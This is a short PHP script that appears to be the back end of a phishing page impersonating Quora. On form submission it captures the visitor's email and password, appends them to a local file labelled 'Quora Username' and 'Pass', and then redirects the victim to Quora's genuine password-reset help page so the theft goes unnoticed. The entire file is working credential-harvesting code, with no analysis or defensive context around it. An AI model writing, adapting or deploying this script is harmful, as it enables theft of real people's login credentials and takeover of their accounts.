<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    $log = "Quora Username: $email | Pass: $password\n";

    file_put_contents("login.txt", $log, FILE_APPEND);

    header('Location: https://help.quora.com/hc/en-us/articles/115004232866-How-do-I-change-or-reset-my-password');
    exit();
}
?>
